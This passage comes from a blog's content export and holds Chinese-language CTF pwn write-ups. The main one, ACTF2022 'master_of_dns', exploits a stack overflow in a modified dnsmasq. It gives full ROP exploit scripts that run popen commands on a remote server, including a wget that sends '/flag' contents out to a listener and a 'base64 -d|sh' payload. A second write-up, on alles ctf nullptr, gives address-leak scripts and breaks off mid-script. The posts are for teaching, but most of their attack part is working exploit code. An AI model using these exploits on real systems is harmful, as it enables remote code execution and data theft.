分页\n\n[x86的分页机制和Linux实现](https://zhuanlan.zhihu.com/p/327860921)\n\nCR0寄存器的PG标识等于1时，表示启用分页机制\n\nCR3 页目录基地址寄存器PDBR（Page-Directory Base address Register）\n\n\n# 参考\n\n[.rept count](http://web.mit.edu/rhel-doc/3/rhel-as-en-3/rept.html)\n\n[x86 registers](https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html)\n\n[kvm (vm escape, kvm, long mode)](https://github.com/kscieslinski/CTF/tree/master/pwn/conf2020/kvm)\n\n\n\n\n\n\n\n","tags":["kvm"],"categories":["CTF"]},{"title":"ACTF2022 pwn master_of_dns题解","url":"/2022/07/01/ACTF2022-pwn-master-of-dns/","content":"\n\n\n- 题目描述：I heard that you are proficient in the DNS protocol, there is just a chance to verify your ability, come and join to solve it.\n\n- 题目附件：[Maser_of_DNS.zip](Maser_of_DNS.zip)\n\n- 提示：题目参考代码: https://thekelleys.org.uk/dnsmasq/doc.html\n\n\n\n这个题涉及的知识点较多（对我来说），有没见过的利用方法/思路，有见过但还不够熟悉的点。所以还花了蛮多时间慢慢调试的。\n\n\n\n# 总结\n\n- 一个dns服务器，通过dig发送一条dns请求报文进行通信\n- 分析dns，根据提示，是dnsmasq。下载对应版本源码，并修改编译选项，编译后使用bindif进行比较\n- 比较找到可疑漏洞点memcpy\n- 使用gdb下断点调试memcpy处\n- 使用wireshark抓dig与dns的通信报文，并用scapy重放\n- 找到关键字段，更改后给dns发送恶意报文\n- 超长报文覆盖返回地址，dns程序崩溃。于是得到了任意代码执行权限\n- 无法泄露信息，考虑ROP利用\n\n\n\n# 分析\n\n## 运行\n\n题目附件运行情况如下，dns是一个dns解析器，我们可以控制发送给它的请求报文内容。\n\n![](image-20220701152020637.png)\n\n## 控制输入\n\ndig程序将报文发送的细节给封装了起来，而我们需要控制发送报文的每一个字节。\n\n因此，使用wireshark抓包。然后，更改报文内容，重新发送。\n\n详情见【wireshark+scapy处理网络数据包】章节。\n\n## 寻找漏洞\n\n找漏洞有两种方法：\n\n1. 类fuzz法：随机改变发送报文的内容，测试能否让dns服务崩溃（看运气）\n2. 代码检视：一点点逆向它的逻辑速度太慢，确认它是dnsmasq 2.86后，可以使用bindiff比对\n\n这里我们使用第二种方法。\n\n下载dnsmasq 2.86软件包并编译：\n\n```bash\nwget https://thekelleys.org.uk/dnsmasq/dnsmasq-2.86.tar.gz\ntar -zxvf dnsmasq-2.86.tar.gz\ncd dnsmasq-2.86\n# 更改Makefile\n# CFLAGS        = -m32 -fno-stack-protector\n# LDFLAGS       = -m32 -no-pie\nmake\n# 在./src/目录下获得dnsmasq\n```\n\n编译完成后，使用**函数级diff工具** [bindiff](https://www.zynamics.com/software.html) 对比查看二进制的差异点。\n\n![](image-20220701154221873.png?size=600)\n\n发现一个大大的memcpy，于是通过 `gdb -p <dns-pid>` attach到dns进程，在 `b *0804F444` 处下断点，观察发送的数据中哪个部分会送到这块进行处理。\n\n## 初步调试\n\n将断点打在memcpy处进行调试\n\n```bash\n# 第一个窗口\n./dns -C ./dns.conf\nps -ef | grep dns\nsudo gdb -p <dns pid>\n> b *0x0804F444\n> c\n# 第二个窗口\ndig @127.0.0.1 -p 9999 baidu.com\n```\n\n断点情况如下\n\n![](image-20220628002022674.png?size=600)\n\n拷贝完成后的栈空间：\n\n![](image-20220628002142647.png?size=600)\n\n根据该漏洞函数中dest的位置，定位ebp和返回地址的内存位置\n\n```c\nint __cdecl sub_804F345(int a1, int a2, int a3, void *src, int a5, int a6)\n{\n  char *v7; // eax\n  char *v8; // eax\n  char *v9; // eax\n  unsigned __int8 *v10; // eax\n  unsigned __int8 *v11; // eax\n  unsigned __int8 *v12; // eax\n  char dest[848]; // [esp+7h] [ebp-381h] BYREF\n```\n\n计算得到ebp存放地址：`0xffa650b7 + 0x381 = 0xffa65438`\n\n查看该栈地址附近内存情况，找到返回地址存放在`0xffa6543c`处，计算偏移：`0xffa6543c - 0xffa650b7 = 0x385  `\n\n![image-20220628002718182](image-20220628002718182.png?size=600)\n\n## 撰写脚本\n\n通过python脚本发送恶意构造的报文，使输入数据覆盖 `sub_804F345` 的返回地址。（本题没开canary）\n\n需要注意几点：\n\n1. 域名中一定包含\".\"，点和点之间最多存放0x3f字节的数据\n2. \".\"在传输过程中，被替换成了后一串字符的实际长度（wireshark抓包发现）\n3. dns报文中Raw数据的总长度，不能超过0x400（`sub_804F345`函数中有检查）\n\n#### 使用scapy发送\n\n这个脚本可以将返回地址覆盖成g.ab\n\n```python\nfrom pwn import *\nfrom scapy.all import *\n\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\nio = remote(\"127.0.0.1\",9999,typ=\"udp\")\n\npacket = rdpcap(\"./dns_catch.pcapng\")\nbyte_data = packet[2][Raw].load\ndns_data = DNS(byte_data)\n\npatch = b\"ls > /tmp/x #\".ljust(0x3f,b\";\")+b\".\"\nshellcode1 = patch*13+b'ls > /tmp/x #iiiiiiiiiiiiiiii'+'erty'+b'ooooooooooooooooooooooo.bnmk'+';;.b'+b\"cde.\"\n# erty -> eax\n# ;;.b -> ebx\n# cde. -> ebp\n\nshellcode2 = p32(0x11111111)\n# 劫持eip为0x11111111\nname_seg = shellcode1 + shellcode2\ndns_data.qd = DNSQR(qname=name_seg,qtype=1,qclass=1)\nbyte_send = raw(dns_data)\nio.sendline(byte_send)\nio.interactive()\n```\n\n\n\n#### 使用pwntools构造裸包\n\n[DNS域名长度限制说明以及实验室实战](https://blog.csdn.net/zhangmingcai/article/details/116719599)\n\n[Common DNS return codes for any DNS service](https://support.umbrella.com/hc/en-us/articles/232254248-Common-DNS-return-codes-for-any-DNS-service-and-Umbrella-)\n\n[Wireshark分析DNS协议](https://blog.csdn.net/buside/article/details/97139367)\n\n[DNS QUERY MESSAGE FORMAT](https://www.firewall.cx/networking-topics/protocols/domain-name-system-dns/160-protocols-dns-query.html)\n\n[DNS原理及其解析过程](https://www.zhihu.com/question/23042131)\n\n经过测试，dns请求报文中，域名字段，通过`\".\"`分隔开，点与点之间的字符个数必须`<=0x3f`\n\n```python\nfrom pwn import *\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\nio = remote(\"127.0.0.1\",9999,typ=\"udp\")\n\n# a = b\"\\x24\\xb4\\x01\\x20\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x05\\x62\\x61\\x69\\x64\\x75\\x03\\x63\\x6f\\x6d\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x29\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x0a\\x00\\x08\\xbe\\x1c\\x51\\x4d\\x75\\xab\\x0c\\x7f\"\n\n# patch = b\"\\x3f\"+b\"ls > /tmp/x#\".ljust(0x3f,b\";\")\npatch = b\"\\x3f\"+b\"a\"*0x3f\n\na_1 = b\"\\x24\\xb4\\x01\\x20\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01\"\na_2 = patch*14+b\"\\x04\"+b\"bcde\"\na_3 = b\"\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x29\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x0a\\x00\\x08\\xbe\\x1c\\x51\\x4d\\x75\\xab\\x0c\\x7f\"\n\nshellcode = b\"\\x04\"+b\"ghij\"\n# 劫持eip为\"ghij\"\na = a_1 + a_2 + shellcode + a_3\nio.sendline(a)\nio.interactive()\n```\n\n\n\n# 控制流劫持后的利用\n\n\n\n## 方法1：往/tmp目录注入脚本\n\n> 不直接将wget字符串写在bss段给popen调用的原因：利用`0x0804b2bb`这条gadget写入时，一次攻击最多只能写20字节，无法写完wget请求的完整字符串。\n\n有用gadget，可以往任意地址写值：\n\n```asm\n0x0804b2bb : mov dword ptr [eax], edx ; ret\n```\n\n往bss段写入内容：\n\n1. 将bss段地址pop给eax\n2. 将待写入内容（4bytes）pop给edx\n\n最后调popen执行写入的内容：\n\n1. 方法1，将参数写死在栈上（bss段地址和字符串\"r\"的地址已知）\n\n2. 方法2，将参数分别pop给eax和edx，然后跳转到如下gadget\n\n   ```asm\n   0x08071802 : push    edx             ; modes\n   0x08071803 : push    eax             ; command\n   0x08071804 : call    _popen\n   ```\n\n\n\n\n\n完整EXP如下：\n\n```python\nfrom pwn import *\nfrom scapy.all import *\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\n\npacket = rdpcap(\"./dns_catch.pcapng\")\nbyte_data = packet[2][Raw].load\n\npop_eax_ret = 0x08059d44\npop_edx_ret = 0x0807ec72\nmov_eax_edx_ret = 0x0804b2bb\nbss_data_addr = 0x80a72d0 # 0x80a7160\nnop_2e_ret = 0x0804a92e\nstr_r_addr = 0x809c7b2\npopen_plt_addr = 0x0804AB40\nexit_addr = 0x0804AD30\n\n# 返回shellcode：往任意一个地址写20个字节的内容\ndef arw4(addr,value):\n\tshellcode = p32(pop_eax_ret) + p32(addr) + p32(pop_edx_ret) + value + p32(mov_eax_edx_ret)\n\treturn shellcode\n\n# 返回shellcode：调用popen函数，需指定两个参数地址\ndef call_popen(commands,modes):\n\tshellcode = p32(popen_plt_addr) + p32(exit_addr) + p32(commands) + p32(modes)\n\treturn shellcode\n\n# 打包shellcode：发送20字节（5*4byte）的内容\ndef pack_payload5(mycmd):\n    payload = arw4(bss_data_addr,mycmd[0:4])\n    payload += arw4(bss_data_addr+4,mycmd[4:8])\n    payload += arw4(bss_data_addr+8,mycmd[8:12])\n    payload += p32(nop_2e_ret)\n    payload += arw4(bss_data_addr+12,mycmd[12:16])\n    payload += arw4(bss_data_addr+16,mycmd[16:20])\n    payload += call_popen(bss_data_addr,str_r_addr)\n    return payload\n# 打包shellcode：发送16字节（4*4byte）的内容\ndef pack_payload4(mycmd):\n    payload = arw4(bss_data_addr,mycmd[0:4])\n    payload += arw4(bss_data_addr+4,mycmd[4:8])\n    payload += arw4(bss_data_addr+8,mycmd[8:12])\n    payload += p32(nop_2e_ret)\n    payload += arw4(bss_data_addr+12,mycmd[12:16])\n    payload += call_popen(bss_data_addr,str_r_addr)\n    return payload\n# 打包shellcode：发送8字节（2*4byte）的内容\ndef pack_payload2(mycmd):\n    payload = arw4(bss_data_addr,mycmd[0:4])\n    payload += arw4(bss_data_addr+4,mycmd[4:8])\n    payload += p32(nop_2e_ret)\n    payload += call_popen(bss_data_addr,str_r_addr)\n    return payload\n\n# 连接远程服务器并发送dns请求报文\ndef send_pack(payload):\n    io = remote(\"59.63.224.108\",9999,typ=\"udp\")\n    # io = remote(\"127.0.0.1\",9999,typ=\"udp\")\n    dns_data = DNS(byte_data)\n    name_seg = b'a'*0x385 + payload\n    dns_data.qd = DNSQR(qname=name_seg,qtype=1,qclass=1)\t# 将新的data揉进dns报文中\n    byte_send = raw(dns_data)\n    io.sendline(byte_send)\n    io.close()\n    sleep(18)\n\n# test_str = b\"wget http://127.0.0.1:6789/ \\`cat /flag \\`\"\ntest_str = b\"wget  http://127.0.0.1:6789/$(cat /flag)\"\t\t# 将要写入脚本中的字符串，将127.0.0.1改成接收flag的服务器ip，监听6789端口（nc -l 6789）\ni = 0\nwhile i<(len(test_str)-1):\n    target = test_str[i:i+2]\n    mycmd1 = b'echo -n \"'+target+b'\">>/tmp/y'\t\t# 通过popen执行echo命令，一次只能发送2个有效字节（哭\n    payload1 = pack_payload5(mycmd1)\n    send_pack(payload1)\n    i+=2\n\nch_exec_cmd = b\"chmod u+x /tmp/y\"\t\t\t# 脚本内容发送完毕后，给脚本文件增加执行权限\npayload2 = pack_payload4(ch_exec_cmd)\nsend_pack(payload2)\n\nexec_cmd = b\"/tmp/y  \"\t\t\t\t\t# 等脚本成功执行，就能在我们自己的服务器上看到flag啦~\npayload3 = pack_payload2(exec_cmd)\nsend_pack(payload3)\n```\n\n拿到flag\n\n![image-20220630175529627](image-20220630175529627.png?size=600)\n\n\n\n\n\n## 方法2：利用更巧妙的gadget\n\n上面的方法需要多次跟服务器交互发送报文，由于发送的报文会导致dns服务重启，下一次发送需等待至少15秒，速度极慢。考虑存不存在ROP链能实现发送一次报文就成功利用。\n\n控制流劫持时，寄存器情况如下：\n\n```bash\n$eax   : 0xffffffff\n$ebx   : 0xffffffff\n$ecx   : 0xffb3d140  →  \";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;.ls > /tmp/x\"\n$edx   : 0xffb3ce67  →  \"ls > /tmp/x #;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;[...]\"\n$esp   : 0xffb3d1ec  →  0x11111111\n$ebp   : 0x2e656463 (\"cde.\"?)\n$esi   : 0x09fe69c0  →  0x00002910\n$edi   : 0xf7f58000  →  0x001ead6c\n$eip   : 0x0804f613  →   ret \n```\n\n目标gadget “call popen”的参数分别存在eax和edx中：\n\n```asm\n.text:08071802  \tpush    edx             ; modes\n.text:08071803  \tpush    eax             ; command\n.text:08071804   \tcall    _popen\n```\n\neax我们通过输入就能直接控制，edx中存着command的地址。如果它们能把edx的值给eax就好了。\n\n寻找跟edx与eax相关的操作指令，如mov，add，sub，xchg等。\n\n```bash\n$ ROPgadget --binary ./dns | grep add | grep edx | grep ret\n......\n0x0804b639 : add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret\n0x0808787b : add eax, edx ; leave ; ret\t\t\t# leave会迁移栈，不适用本题情况\n......\n```\n\n于是发现了0x804b639这条gadget。\n\n调试过程中发现两个问题：\n\n1. add eax,edx后，需要给eax加1。于是通过`0x08056434`这条gadget配合给eax的初始值来调整\n\n   ```bash\n   0x08056434 : add eax, 0x1b8 ; add cl, cl ; ret\n   0x0804c29a : adc al, 1 ; ret 0x458b  \t\t# ret 0x458b不可用，esp会转移到未map地址空间\n   ```\n\n   \n\n2. 在执行popen函数过程中，command由于在低地址，被新的数据覆盖了，导致无法成功执行命令。\n\n   于是需要将command放在我们payload的后面（栈的高地址空间按），并调整一下eax的值\n\n最终利用脚本如下：\n\n```python\nfrom pwn import *\nfrom scapy.all import *\n\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\nio = remote(\"127.0.0.1\",9999,typ=\"udp\")\n# io = remote(\"59.63.224.108\",9999,typ=\"udp\")\n\neax_init = 0xf7f593d5         # hex(0xffffffff - 0x80a6fe0 + 0x3b6) = 0xf7f593d5\ng_adjust_eax = 0x0804b319      # 0x0804b319 : add eax, 0x80a6fe0 ; add ecx, ecx ; ret\ng_add_eax_edx = 0x0804b639      # add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret\ng_pop_edx = 0x0807ec72            # pop edx ; ret\nr_addr = 0x809c7b2              # &'r'\ng_popen_addr = 0x08071802       # push edx; push eax; call _popen\n\ndef construct_pkg(input_str):\n    # the data extracted from dns packet\n    start_dns = b\"\\x24\\xb4\\x01\\x20\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01\"\n    end_dns = b\"\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x29\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x0a\\x00\\x08\\xbe\\x1c\\x51\\x4d\\x75\\xab\\x0c\\x7f\"\n    patch = b\"\\x3f\"+b\"a\"*0x3f\n    shellcode1 = patch*13 + b\"\\x3f\" + b'a'*29 +p32(eax_init) + b'a'*30 + b\"\\x04\"+ b\"a\"*4\n    shellcode2 = b\"\\x2c\" + p32(g_add_eax_edx)+p32(0xffffffff)+p32(0xffffffff)+p32(0xffffffff)\\\n            +p32(0xffffffff)+p32(0xffffffff)+p32(0xffffffff)\\\n            +p32(g_adjust_eax)+p32(g_pop_edx)+p32(r_addr)+p32(g_popen_addr)\n    cmd_str = chr(len(input_str)+3).encode() + b\"a\"*3 + input_str\n    payload = start_dns + shellcode1 + shellcode2 + cmd_str + end_dns\n    # print(len(shellcode1))        # 0x385\n    # print(len(shellcode2))        # 0x2d\n    # print(hex(len(shellcode1)+len(shellcode2)))       # 0x3b2\n    return payload\n\n# echo wget 127.0.0.1/`cat /flag` | base64  #### d2dldCAxMjcuMC4wLjEvZmxhZ3t0ZXN0fQo=\ninput_str = b\"echo d2dldCAxMjcuMC4wLjEvZmxhZ3t0ZXN0fQo=|base64 -d|sh\"       # 根据自己服务器ip不同，需要改base64的内容\npayload = construct_pkg(input_str)\n\nio.send(payload)\nio.interactive()\n```\n\n\n\n# 续：wireshark+scapy处理网络数据包\n\n## wireshark抓包\n\n[Ubuntu 上 Wireshark 的安装与使用](https://zhuanlan.zhihu.com/p/112649281)\n\n安装wireshark并抓包\n\n```bash\nsudo apt show wireshark\t\t\t# 查看wireshark的可用版本\nsudo apt install wireshark\t\t# 安装wireshark\nsudo wireshark\t\t\t\t\t# 以root用户启动wireshark\n```\n\ndig访问本地9999端口调用dns解析服务，用wireshark抓包。先后访问了两次，得到如下报文：[dns_catch.pcapng](dns_catch.pcapng)\n\n![image-20220628174139141](image-20220628174139141.png?size=600)\n\nData段未自动解析成dns报文（因端口非默认的53），因此按如下步骤将dns udp对应的端口设置成9999\n\n![image-20220628174655395](image-20220628174655395.png?size=600)\n\n选中DNS，改UDP ports为9999\n\n![image-20220628174745837](image-20220628174745837.png?size=600)\n\n解析成功，如下：\n\n![image-20220628175000577](image-20220628175000577.png?size=600)\n\n\n\n## 安装scapy\n\n[Python Scapy 报文构造和解析](https://www.cnblogs.com/hiyong/p/14406739.html)\n\n[地表最强数据包工具--Scapy基础篇](https://bbs.huaweicloud.com/blogs/278399)\n\n[网络工具-Scapy使用介绍](https://mathpretty.com/12344.html)\n\n[盘点一款Python发包收包利器——Scapy](https://developer.51cto.com/article/660332.html)\n\n[Python学习：scapy库的Packet与str相互转换](https://blog.csdn.net/KiteRunner/article/details/119521215)\n\n```bash\npip install scapy\n```\n\n在python中引入scapy库\n\n```python\nfrom scapy.all import *\n\npacket = rdpcap(\"./dns_catch.pcapng\")\npacket.summary()\npacket[0].show()\nprint(packet[3][Ether].src)\nprint(packet[3][IP].src)\nprint(ls())\t\t\t\t\t# 显示所有支持的数据包对象。另，通过ls(ARP)来查看指定包的具体内容\nprint(lsc())\t\t\t\t# 列出所有函数\nshow_interfaces()\t\t\t# 显示网卡信息\n```\n\n用scapy交互操作网络数据包，读取pcap文件中Raw部分，并按DNS格式解析\n\n```python\nfrom pwn import *\nfrom scapy.all import *\n\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\n\nio = remote(\"127.0.0.1\",9999,typ=\"udp\")\n\npacket = rdpcap(\"./dns_catch.pcapng\")\nbyte_data = packet[2][Raw].load\ndns_data = DNS(byte_data)\ndns_data.show()\t\t\t# 可以查看数据按照DNS格式解析后的结果\n\n# 替换域名字段发起攻击\ndns_data.qd = DNSQR(qname=\"qqqqqq.aaaaa.sssss.com.ddddd.dddddd\",qtype=1,qclass=1)\n\nbyte_send = raw(dns_data)\t\t# 将<class 'scapy.layers.dns.DNS'>转换成<class 'bytes'>类型\n\nio.sendline(byte_send)\nio.interactive()\n\n# 构造一个DNS请求报文\n# c = DNS(id=1,qr=0,opcode=0,tc=0,rd=1,qdcount=1,ancount=0,nscount=0,arcount=0)\n# c.qd = DNSQR(qname=www.baidu.com,qtype=1,qclass=1)\n\n```\n\n## 构造报文\n\n用pwntools发送一个合法的包\n\n```python\nfrom pwn import *\n\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\n\nio = remote(\"127.0.0.1\",9999,typ=\"udp\")\n\na = \"\\x24\\xb4\\x01\\x20\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x05\\x62\\x61\\x69\\x64\\x75\\x03\\x63\\x6f\\x6d\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x29\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x0a\\x00\\x08\\xbe\\x1c\\x51\\x4d\\x75\\xab\\x0c\\x7f\"\n# 这段数据是直接从wireshark中摘出来的\nio.sendline(a)\nio.interactive()\n```\n\n# 续：x86下找可用的gadget\n\n一种方法是使用 `--only` 指定\n\n```bash\nROPgadget --binary ./dns --only \"pop|ret\"\nROPgadget --binary ./dns --only \"mov|ret\"\nROPgadget --binary ./dns --only \"xchg|ret\"\nROPgadget --binary ./dns --only \"add|ret\"\nROPgadget --binary ./dns --only \"sub|ret\"\nROPgadget --binary ./dns --only \"inc|ret\"\nROPgadget --binary ./dns --only \"dec|ret\"\n# 等等\n```\n\n另一个种方法是直接 `grep`\n\n例如，本题中找到带0x2e的nop+ret指令，可以用如下命令：\n\n```bash\n$ ROPgadget --binary ./dns | grep 2e | grep nop\n0x08052e0e : inc ebp ; nop ; jmp 0x8052ea8\n0x08052eb5 : nop ; add byte ptr [ebp + 0x4d], dh ; jmp 0x8052ec8\n0x08052eb2 : nop ; cmp dword ptr [ebp - 0x70], 0 ; jne 0x8052f0d ; jmp 0x8052ecb\n0x08052e0f : nop ; jmp 0x8052ea7\n0x0808cc29 : nop ; jmp 0x808cc2e\n0x0804a92e : nop ; ret\n```\n\n\n\n# 续：比对二进制-bindiff的使用方法\n\n函数级diff工具：[bindiff](https://www.zynamics.com/software.html)\n\n结合IDA一起使用\n\n\n\n# 续：GDB调试方法汇总\n\n1、正常使用gdb启动程序\n\n```bash\ngdb ./xxx\n```\n\n2、正常启动程序，使用gdb attach\n\n```bash\n# 窗口1\n./xxx\n# 窗口2\nps -ef | grep xxx\ngdb -p <xxx pid>\n```\n\n3、正常启动程序，使用gdbserver attach，后使用gdb连接\n\n```bash\n# 窗口1\n./xxx\n# 窗口2\nps -ef | grep xxx\ngdbserver :1234 --attach <xxx pid>\n# 窗口3\ngdb\n> target remote :1234\n```\n\n4、【多进程】启动程序时指明不开启子进程\n\n```\n./dns -d -C ./dns.conf\n```\n\n5、设置gdb调试多进程/多线程\n\n[GDB 调试多进程或者多线程应用](https://blog.csdn.net/gatieme/article/details/78309696)\n\n```bash\nset follow-fork-mode [parent|child]\t\t# 设置调试[父进程/子进程]\nset detach-on-fork [on|off]\t\t\t\t# 未调试进程[继续执行/block在fork位置]\nshow follow-fork-mode\nshow detach-on-fork\ninfo inferiors\t\t\t\t# 查看正在调试的进程信息\ninfo threads\t\t\t\t# 查询线程\nthread <thread number>\t\t# 切换线程\n```\n\n[使用strace跟踪多进程程序](https://cloud.tencent.com/developer/article/1757470)\n\n```\nstrace -ff -o test.txt ./dns -C ./dns.conf\n```\n\n\n\n","tags":["dns","wireshark","scapy","bindiff","gdb"],"categories":["CTF"]},{"title":"alles ctf 2020 之 nullptr","url":"/2022/02/20/alles-ctf-2020-nullptr/","content":"\n\n\n题目附件：[nullptr](nullptr.zip)\n\n# 漏洞分析\n\n![](nullptr1.png)\n\n-\t64位x86-64可执行程序\n-\t动态链接，未去符号表\n-\tCanary、栈不可执行均开启\n-\tPIE开启，地址随机化\n-\tPartial RELRO，got表可写\n\n![](nullptr2.png)\n\n这个题给了源码，所以就直接分析源码吧。While循环中的主要处理逻辑是两个case：\n\n​\t1、view address：用户输入一个地址，程序会将该地址及该内存地址上的值打印出来。\n\n​\t2、nuke address：用户输入一个地址，程序会将该地址置为NULL，也就是说将该地址的八个字节全部变为0。\n\n除此之外，这个题还给了一个现成的执行“/bin/sh”的函数，因此只要我们能控制eip到这个函数就能get shell了。\n\n**漏洞点**：未初始化的局部变量addr，以及scanf（\"%lu\", &addr）。当用户输入给scanf的值非数字时，内部转化会失败， 此时scanf函数中会free用到的指针，然后返回，返回的时候不会更改其他函数参数的值（此题为addr）。由于addr是栈上一个未初始化的值，因此18行打印的时候会泄露栈上的一个值。\n\n\n\n# 利用过程\n\n## 泄露栈地址与函数地址\n\n![](nullptr3.png)\n\nview address给非数字时，就会打印栈上的信息。可以看到addr所处的栈位置正好存放的是另一个栈地址，且其值为1。在gdb中调试的时候这个栈地址的值是不会变的，也就是说这个地址一定跟main函数运行之前的函数相关。\n\n一个程序加载运行的过程是这样的：\n\n![](nullptr4.png)\n\n经过调试分析，通过view addr泄露出来的栈地址是比main函数栈更高的位置，也就是__libc_start_main或者_start的栈帧。因此，通过这个栈地址的偏移可以找到存放返回地址（_start）的栈。\n\n![](nullptr5.png)\n\n本地调试可以计算出`_start`函数地址存放的位置距离第一次泄露的栈地址：\n\n0x7fffffffdec0 - 0x7fffffffde98 = 0x28 （docker环境中还需要以8字节为单位调试获取实际值）\n\n因此，再调用view addr一次，就可以泄露出`_start`函数地址，根据该地址与IDA静态分析的_start函数地址差值，就计算出了程序的加载基址，那么就绕过PIE了。\n\n![](nullptr6.png)\n\n## 泄露libc\n\n有了程序加载基址，通过got.plt条目，泄露puts函数的地址，进而获得libc加载基址。\n\n![](nullptr7.png)\n\n到这一步的参考代码：\n\n```python\n# pie_leak_libc.py\n# coding-utf-8\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./nullptr\")\nmylibc = ELF(\"./libc-2.30.so\")\nmyld = ELF(\"./ld-2.30.so\")\nmyproc = remote(\"127.0.0.1\",1024)\n#myproc = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n\ndef view(addr):\n    myproc.recvuntil(\"[1. view, 2. null, -1. exit]> \")\n    myproc.sendline('1')\n    myproc.recvuntil(\"view address> \")\n    myproc.sendline(addr)\n    myproc.recvline()\n    ret = myproc.recvline()\n    return ret\n\ndef setnull(addr):\n    myproc.recvuntil(\"[1. view, 2. null, -1. exit]> \")\n    myproc.sendline('2')\n    myproc.recvuntil(\"nuke address> \")\n    myproc.sendline(addr)\n\n###泄露栈地址\n#gdb.attach(myproc,'file ./nullptr \\n b* main')\nstack_addr = int(view('a').strip().split(\":\")[0],16)\n#log.warn(\"stack_addr is: 0x%x\" % stack_addr)\n\n###泄露_start函数地址\noffset1 = stack_addr - (0x28 + 8*1)\n#offset1 = stack_addr - 0x28 \nstart_addr = int(view(str(offset1)).strip().split(\":\")[1],16)\n#log.warn(\"start_addr is: 0x%x\" % start_addr)\n\n###计算程序加载基址\nelf_base = start_addr - myelf.symbols['_start']\nshell_addr = elf_base + myelf.symbols['get_me_out_of_this_mess']\nlog.warn(\"elf_base is: 0x%x\" % elf_base)\n#log.warn(\"shell_addr is: 0x%x\" % shell_addr)\n\n###泄露libc加载基址\nputs_got = elf_base + myelf.got[\"puts\"]\ngot_base = puts_got - 0x18\nputs_libc = int(view(str(puts_got)).strip().split(\":\")[1],16)\nlibc_base = puts_libc - mylibc.symbols[\"puts\"]\n#log.warn(\"puts_got is: 0x%x\" % puts_got)\nlog.warn(\"puts_libc is: 0x%x\" % puts_libc)\nlog.warn(\"libc_base is: 0x%x\" % libc_base)\nlog.warn(\"got_base is: 0x%x\" % got_base)\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n## 花式覆写got表\n\n整理一下现在有的条件：\n-\t程序和libc的加载基址\n-\tget shell函数的地址\n-\twhile循环中的case2，任意地址写null\n\nstdin涉及的_IO_FILE结构：\n\n![](nullptr8.png)\n\nscanf函数将用户输入先存放在`_IO_read_base`指向的堆空间中，最后将输入更新到`_IO_buf_base`指向的堆空间。堆空间和elf加载空间（内含got表项）是相邻的，如下图，且存在两者地址只有后3个字节不同的情况。因为开了PIE，如果某次`got.plt`的起始地址后3个字节是全零，那么我们只需要把`_IO_buf_base`处存放的堆地址其后3个字节写成0，下一次调用scanf时输入就会被写到got表中，那么我们就可以任意改写got表项，劫持函数。\n\n![](nullptr9.png)\n\n测试是否存在后3个字节全为0的got.elf项：\n\n```python\n# test_got_plt.py\n# coding-utf-8\nfrom pwn import *\n# context(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nwhile True:\n    myelf = ELF(\"./nullptr\")\n    mylibc = ELF(\"./libc-2.30.so\")\n    myld = ELF(\"./ld-2.30.so\")\n    myproc = remote(\"127.0.0.1\",1024)\n    \n    def view(addr):\n        myproc.recvuntil(\"[1. view, 2. null, -1. exit]> \")\n        myproc.sendline('1')\n        myproc.recvuntil(\"view address> \")\n        myproc.sendline(addr)\n        myproc.recvline()\n        ret = myproc.recvline()\n        return ret\n\n    def setnull(addr):\n        myproc.recvuntil(\"[1. view, 2. null, -1. exit]> \")\n        myproc.sendline('2')\n        myproc.recvuntil(\"nuke address> \")\n    \n  \n    stack_addr = int(view('a').strip().split(\":\")[0],16)\n    #log.warn(\"stack_addr is: 0x%x\" % stack_addr)\n\n    offset1 = stack_addr - (0x28 + 8*1)\n    start_addr = int(view(str(offset1)).strip().split(\":\")[1],16)\n    log.warn(\"start_addr is: 0x%x\" % start_addr)\n\n    elf_base = start_addr - myelf.symbols['_start']\n    shell_addr = elf_base + myelf.symbols['get_me_out_of_this_mess']\n    elf_got_base = elf_base + 0x4000\n    log.warn(\"elf_base is: 0x%x\" % elf_base)\n    log.warn(\"elf_got_base: 0x%x\" % elf_got_base)\n    log.warn(\"shell_addr is: 0x%x\" % shell_addr)\n\n    puts_got = elf_base + myelf.got[\"puts\"]\n    puts_libc = int(view(str(puts_got)).strip().split(\":\")[1],16)\n    libc_base = puts_libc - mylibc.symbols[\"puts\"]\n    log.warn(\"puts_got is: 0x%x\" % puts_got)\n    log.warn(\"puts_libc is: 0x%x\" % puts_libc)\n    log.warn(\"libc_base is: 0x%x\" % libc_base)\n\n    if elf_got_base &0xfff000 == 0:\n        log.warn(\"success!elf_got_base is: 0x%x\" % elf_got_base)\n        #gdb.attach(myproc)\n        